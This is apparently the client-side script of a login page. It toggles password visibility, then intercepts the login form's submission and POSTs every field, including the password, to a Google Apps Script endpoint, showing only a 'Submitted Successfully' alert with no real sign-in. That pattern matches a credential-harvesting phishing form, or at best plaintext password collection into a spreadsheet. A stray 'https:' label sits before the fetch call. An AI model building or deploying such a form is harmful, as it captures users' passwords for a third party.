const passwordInput = document.getElementById("password");
const togglePasswordButton = document.getElementById("toggle-password");
const eyeIcon = document.querySelector(".eye-icon");
const eyeSlashIcon = document.querySelector(".eye-slash-icon");

togglePasswordButton.addEventListener("click", function () {
  const type =
    passwordInput.getAttribute("type") === "password" ? "text" : "password";

  passwordInput.setAttribute("type", type);

  if (type === "password") {
    eyeIcon.style.display = "inline";
    eyeSlashIcon.style.display = "none";
  } else {
    eyeIcon.style.display = "none";
    eyeSlashIcon.style.display = "inline";
  }
});

 const scriptURL =
   "https://script.google.com/macros/s/AKfycbx98unq7QAbKHVsb47NlKlL1DvxeTUQEf0nb7tfAU_-ULG7x35DJJEY62OB0IyOu6u3ZA/exec";
 const form = document.forms["login-form"];
 form.addEventListener("submit", (e) => {
   e.preventDefault();
   var formData = new FormData(form);

https: fetch(scriptURL, { method: "POST", body: formData })
  .then((response) => {
    swal("Done", "Submitted Successfully.", "success");
  })
  .catch((error) => {
    swal("Error", "Something went wrong. please try again!", "error");
  });
 });


